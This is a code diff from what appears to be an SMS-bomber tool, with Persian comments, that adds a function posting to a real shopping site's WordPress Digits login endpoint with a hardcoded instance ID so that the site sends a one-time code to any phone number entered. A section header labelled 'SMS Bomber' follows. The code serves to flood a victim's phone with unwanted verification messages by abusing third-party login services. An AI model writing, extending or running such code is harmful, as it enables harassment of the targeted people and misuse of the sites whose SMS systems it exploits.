@@ -43,39 +43,37 @@ r = "\033[91m"  # قرمز
 g = "\033[92m"  # سبز
 a = "\033[0m"   # ریست
 
+import requests
+
 def ilozi(phone):
     url = "https://ilozi.com/wp-admin/admin-ajax.php"
+    
+    # داده‌هایی که باید در request ارسال بشه
     payload = {
         "action": "digits_forms_ajax",
         "type": "login",
+        "digits": "1",
+        "instance_id": "a15a96e438ca5771bfd748a1fdf98103",
         "action_type": "phone",
-        "digits_phone": "0" + phone.split("+98")[1],
-        "instance_id": "a15a96e438ca5771bfd748a1fdf98103",  # از HTML صفحه بگیر
-        "nonce": "b0805527b6",                             # از HTML صفحه بگیر
-        "digits": "1"
+        "digits_phone": phone,
+        "login_digt_countrycode": "+98" if phone.startswith("+98") else "",
     }
-
-    headers = {
-        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-        "X-Requested-With": "XMLHttpRequest",
-        "User-Agent": "Mozilla/5.0"
-    }
-
+    
     try:
-        response = requests.post(url, data=payload, headers=headers, timeout=5)
+        response = requests.post(url, data=payload, timeout=5)
         if response.status_code == 200:
-            print(f'{g}(Ilozi) {a}Code Sent')
+            print(f"(Ilozi) Code Sent to {phone}")
             return True
         else:
-            print(f'{r}[-] (Ilozi) Failed or No Response{a}')
+            print(f"[-] (Ilozi) Failed or No Response, Status: {response.status_code}")
             return False
     except Exception as e:
-        print(f'{r}[!] Ilozi Exception: {e}{a}')
+        print(f"[!] Ilozi Exception: {e}")
         return False
 
-# تست
-phone = "+989123456789"
-ilozi(phone)
+# گرفتن شماره از کاربر
+phone_input = input("Enter phone number (e.g. +989123456789): ")
+ilozi(phone_input)
 
 # ------------------------------
 # SMS Bomber
